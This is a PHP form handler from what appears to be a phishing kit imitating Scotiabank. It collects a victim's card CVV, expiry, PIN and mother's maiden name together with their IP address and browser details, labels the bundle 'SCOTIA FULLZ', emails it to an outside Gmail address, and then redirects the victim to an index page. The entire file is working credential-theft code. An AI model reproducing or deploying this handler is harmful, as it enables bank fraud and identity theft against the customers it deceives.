<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$exp = $_POST['dl'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
$pin = $_POST['pin'];
$data ="
=============##SCOTIA FULLZ##===================
CVV : $cvv
EXP : $exp
MMN : $mmn
PIN : $pin
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: ../index.html");

?>